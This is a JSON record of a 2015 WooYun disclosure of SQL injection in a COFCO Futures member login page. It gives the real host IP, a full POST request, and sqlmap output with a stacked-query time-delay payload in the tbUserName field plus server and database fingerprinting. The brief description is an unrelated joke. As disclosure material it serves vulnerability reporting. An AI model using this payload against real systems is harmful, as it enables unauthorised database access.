{"id": 22545, "wybug_id": "wooyun-2015-0131486", "wybug_title": "中粮期货会员管理系统SQL注入", "wybug_corp": "中粮集团有限公司", "wybug_author": "missy", "wybug_date": "2015-08-04 11:45", "wybug_open_date": "2015-09-18 14:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向公众公开  简要描述： 老师用投影仪给学生讲课，上网挂着迅雷。 讲的正投入的时候，屏幕突然弹出一个对话框：“苍井空763M，下载完毕，是否打开” 这时，台下的学生们齐喊：“打开！打开！打开！打开！打开！” 这老师纠结啊。 详细说明：  \nhttp://219.143.252.76/cn/web/user_login.aspx\n\n\n\nPOST /cn/web/user_login.aspx HTTP/1.1Host: 219.143.252.76User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://219.143.252.76/cn/web/user_login.aspxCookie: ASP.NET_SessionId=p5ttirxwt5ud2okwn4k3f4ikConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 325__EVENTTARGET=lbLogin&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTkxNTcxOTIzMw9kFgICAw9kFgICBQ8PFgIeBFRleHQFG%2BeUqOaIt%2BWQjeaIluWvhueggemUmeivr%2B%2B8gWRkZGUFsgBRNVTzSi58Iq3joynEoQC4XJW2hPZLHG3zSs5r&__EVENTVALIDATION=%2FwEWBAKew42zCgLyj%2FOQAgLAr6WkDALRy8HXAudLVEUSuF79Vm5odSLKMvYe7riMIb8kIsKCKePqayNz&tbUserName=123&tbPwd=123\n\n\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: tbUserName (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __EVENTTARGET=lbLogin&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTkxNTcxOTIzMw9kFgICAw9kFgICBQ8PFgIeBFRleHQFG+eUqOaIt+WQjeaIluWvhueggemUmeivr++8gWRkZGUFsgBRNVTzSi58Iq3joynEoQC4XJW2hPZLHG3zSs5r&__EVENTVALIDATION=/wEWBAKew42zCgLyj/OQAgLAr6WkDALRy8HXAudLVEUSuF79Vm5odSLKMvYe7riMIb8kIsKCKePqayNz&tbUserName=123';WAITFOR DELAY '0:0:5'--&tbPwd=123---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000current database:    'zlqh_web'\n   漏洞证明：  \nsqlmap resumed the following injection point(s) from stored session:---Parameter: tbUserName (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __EVENTTARGET=lbLogin&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTkxNTcxOTIzMw9kFgICAw9kFgICBQ8PFgIeBFRleHQFG+eUqOaIt+WQjeaIluWvhueggemUmeivr++8gWRkZGUFsgBRNVTzSi58Iq3joynEoQC4XJW2hPZLHG3zSs5r&__EVENTVALIDATION=/wEWBAKew42zCgLyj/OQAgLAr6WkDALRy8HXAudLVEUSuF79Vm5odSLKMvYe7riMIb8kIsKCKePqayNz&tbUserName=123';WAITFOR DELAY '0:0:5'--&tbPwd=123---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000current database:    'zlqh_web'\n   修复方案：     版权声明：转载请注明来源 missy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-04 13:58 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}